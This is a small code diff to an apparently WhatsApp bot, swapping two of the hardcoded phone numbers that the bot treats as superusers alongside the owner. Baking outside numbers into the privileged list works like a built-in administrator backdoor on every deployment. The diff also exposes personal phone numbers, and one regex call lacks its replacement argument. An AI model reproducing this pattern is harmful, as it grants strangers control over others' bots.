@@ -82,8 +82,8 @@ zk.ev.on("messages.upsert", async (m) => {
             const { getAllSudoNumbers } = require("./lib/sudo");
             const nomAuteurMessage = ms.pushName;
             const abu1 = '254710772666';
-            const abu2 = '254710772666';
-            const abu3 = "254710772666";
+            const abu2 = '254106727593';
+            const abu3 = "254727716045";
             const abu4 = '254710772666';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
